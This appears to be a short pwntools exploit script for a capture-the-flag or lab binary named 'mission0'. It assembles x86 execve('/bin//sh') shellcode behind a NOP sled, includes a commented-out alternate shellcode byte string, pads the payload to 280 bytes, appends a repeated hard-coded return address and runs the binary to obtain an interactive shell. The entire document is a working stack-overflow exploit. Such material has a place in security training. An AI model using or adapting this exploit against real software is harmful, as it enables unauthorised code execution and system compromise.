
from pwn import *

add = 0xffffc84c + 40

shell = "nop\n" * 32

shell += """
xor eax, eax    # Setup the eax to call the sys_execve
push eax
push 0x68732f6e
push 0x69622f2f
inc eax         # 1
inc eax         # 2
inc eax         # 3
inc eax         # 4
inc eax         # 5
inc eax         # 6
inc eax         # 7
inc eax         # 8
inc eax         # 9
inc eax         # a
inc eax         # b
xor ecx, ecx    # set the param to NULL
xor edx, edx    # set the enviornm to NULL
mov ebx, esp
int 0x80
"""

#shell += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

shell = asm(shell)

print(disasm(shell))

arg = shell + "A" * (280 - len(shell))

for _ in range(10):
    arg += p32(add)

assert "\0" not in arg

print(len(arg))

with open("shellcode.bin", "wb") as f:
	f.write(arg)

p = process(["../mission0", arg])

p.interactive()
